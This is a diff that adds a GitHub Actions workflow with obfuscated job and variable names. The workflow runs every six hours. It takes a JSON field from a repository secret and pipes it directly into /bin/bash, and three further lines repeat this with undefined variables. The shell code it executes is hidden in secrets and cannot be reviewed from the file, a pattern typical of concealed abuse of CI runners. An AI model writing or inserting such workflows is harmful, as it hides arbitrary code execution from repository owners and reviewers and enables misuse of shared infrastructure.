@@ -1,0 +1,22 @@
+name: taohuixuan2518
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: taohuixuan2518
+        env:
+          tbrds15: ${{ secrets.tbrds15 }}
+        run: |
+          echo $tbrds15 | jq -r .s97 | /bin/bash
+          echo $f43 | jq -r .e827 | /bin/bash
+          echo $ni2859 | jq -r .xh4595 | /bin/bash
+          echo $qgmde07327 | jq -r .rsh703 | /bin/bash
+
